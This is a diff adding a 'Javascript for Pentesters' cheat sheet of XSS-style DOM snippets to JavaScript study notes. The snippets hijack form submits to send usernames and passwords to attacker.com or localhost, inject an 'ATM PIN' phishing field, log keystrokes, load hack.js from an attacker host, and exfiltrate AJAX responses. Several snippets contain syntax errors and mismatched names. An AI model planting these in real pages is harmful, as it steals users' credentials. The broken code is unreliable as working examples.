@@ -12,6 +12,7 @@
 - [Constructors](#constructors)
 - [Type Coercion](#type-coercion)
 - [Scopes and Closures](#scopes-and-closures)
+- [Javascript for Pentesters](#javascript-for-pentesters)
 - [References](#references)
 
 ## Notes
@@ -46,6 +47,30 @@ setTimeout(fn, 1000);
 var fn = function(){
   console.log("Hello World !!");
 };
+
+// Find the element
+window.document.getElementsByTagName("h1")
+
+// Modify the HTML content
+window.document.getElementsByTagName("h1")[1].innerHTML = "you are modified"
+
+// Modify the link
+document.getElementsByTagName("a")[1].href = "https://www.roguesecurity.in;
+
+// Modify the image
+document.getElementsByTagName('img')[0].src="https://attacker.com/image.png";
+
+// Modify the form submit URL
+document.forms[0].action = "http://attacker.com/";
+
+// Create a new image (for data exfilteration)
+new Image().src = "http://localhost:8001/?username="+username+"&password=" + password;
+
+// Create new HTML element
+var newElement = document.createElement("h1");
+
+// split the url
+var token = window.location.search.split('&')[1];
 
 ```
 
@@ -287,6 +312,191 @@ function createPerson() {
 var person = createPerson();
 console.log(person.getFirstName());
 ```
+
+## Javascript for Pentesters
+
+### Select list of all html elements by tag name (e.g. h1, p)
+```javascript
+window.document.getElementsByTagName("h1")
+```
+
+### Modify the value of a particular tag
+```javascript
+window.document.getElementsByTagName("h1")[1].innerHTML = "you are modified"
+window.document.getElementsByTagName("h1")[1].textContent = "you are modified again"
+```
+
+### Modify the link on the page
+```javascript
+document.getElementsByTagName("a")[1].href = "https://www.roguesecurity.in;
+```
+
+### Change the image
+```javascript
+document.getElementsByTagName('img')[0].src="https://attacker.com/image.png";
+```
+
+### Get all the elements (textbox, button) of a form in form of an array
+```javascript
+document.forms[0].elements
+```
+### Get the value from the textbox
+```javascript
+document.forms[0].elements[0].value
+```
+
+### Modify form's submit action
+```javascript
+document.forms[0].action = "http://attacker.com/";
+```
+
+### Call the function on form submit
+```javascript
+document.forms[0].onsubmit = InterceptFunction;
+
+function InterceptFunction(){
+	// Do something
+}
+```
+
+### Create a new image element on the page
+```javascript
+new Image().src = "http://localhost:8001/?username="+username+"&password=" + password;
+```
+
+### Hijack form submit
+```javascript
+document.forms[0].onsubmit = InterceptFunction;
+
+function InterceptFunction() {
+	var username = document.forms[0].elements[0].value;
+	var password = document.forms[0].elements[1].value;
+	
+	new Image().src = "http://attackerdomain/?username="+username+"&password="password;
+}
+```
+
+### Create new element and set the attributes
+```javascript
+var input = document.createElement("input");
+input.setAttribute("type", "text");
+input.setAttribute("class", "input-block-level");
+input.setAttribute("placeholder", "ATM PIN");
+input.setAttribute("name", "atmpin");
+
+// Add element to the form
+var previous = document.forms[0].elements[0];
+document.forms[0].insertBefore(input, previous);
+```
+
+### Add and remove elements from the form
+```javascript
+var newElement = document.createElement("h1");
+newElement.innerHTML = "You have been hacked !!"
+document.forms[0].parentNode.appendChild(newElement);
+document.forms[0].parentNode.removeChild(document.forms[0]);
+```
+
+### Capture the click event on the page
+```javascript
+// add event listener at document body level
+document.body.addEventListener('click', ClickHandler, true);
+function ClickListener(){
+	alert('clicked !!');
+```
+
+### Redirect
+```javascript
+location.href = "http://attacker.com"
+```
+
+### Keylogger
+```javascript
+document.onkeypress = function(keystroke){
+	key_pressed = String.fromCharCode(keystroke.which);
+	alert("The key " + key_pressed + " is pressed");
+}
+```
+
+### Add external javascript reference
+```javascript
+var newElement = document.createElement('script');
+newElement.type = "text/javascript";
+newElement.src = "http://attacker.com/hack.js";
+document.body.appendChild(newElement);
+}
+```
+
+### Autosubmit form
+```javascript
+window.setTimeout(fn, 1000);
+var fn = function(){
+	document.forms[0].action = "https://attacker.com/";
+	document.forms[0].submit();
+}
+```
+
+### AJAX GET request
+```javascript
+var username = document.forms[0].elements[0].value;
+ 
+ var password = document.forms[0].elements[1].value;
+
+ window.setTimeout(function(){
+ 
+ var req = new XMLHttpRequest();
+
+ req.open("GET", "http://localhost:8001/?username=" + username + "&password=" + password, true);
+
+ req.send();
+ }, 1000);
+```
+
+### AJAX read response
+```javascript
+var username = document.forms[0].elements[0].value;
+ 
+ var password = document.forms[0].elements[1].value;
+
+ // handler to process the response
+req.onreadystatechange = function () {
+if (req.readyState == 4 && req.status == 200){
+
+  // HTML received
+  document.getElementsById("someid").innerHTML = req.responseText;
+  }
+}
+
+ window.setTimeout(function(){
+ 
+ var req = new XMLHttpRequest();
+
+ req.open("GET", "http://localhost:8001/?username=" + username + "&password=" + password, true);
+
+ req.send();
+ }, 1000);
+```
+
+### AJAX POST Request
+```javascript
+function AJAXRequest(){
+// handler to process the response
+req.onreadystatechange = function () {
+  if (req.readyState == 4 && req.status == 200){
+  // HTML received
+  new Image().src = "http://attacker.com/?data=" + req.responseText;
+  }
+}
+  var req = new XMLHttpRequest();
+  req.open("POST", "http://victim.com/", true);
+
+  req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+
+  req.send("user=john");
+}
+```
+
+
 
 ## References
 
